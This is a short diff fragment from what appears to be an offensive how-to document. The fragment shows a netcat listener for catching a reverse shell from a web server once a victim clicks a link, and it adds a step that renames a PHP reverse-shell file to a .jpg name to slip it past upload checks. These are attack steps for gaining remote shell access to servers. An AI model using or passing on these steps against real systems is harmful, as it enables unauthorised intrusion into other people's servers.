@@ -36,3 +36,11 @@ nc -nlvp 1234
 ```
 
 Once user click on link, reverse shell of the server will open.
+
+Modify file register as image file:
+
+Try to rename the file
+```
+cp rvs.php rvs.php.jpg
+```
+
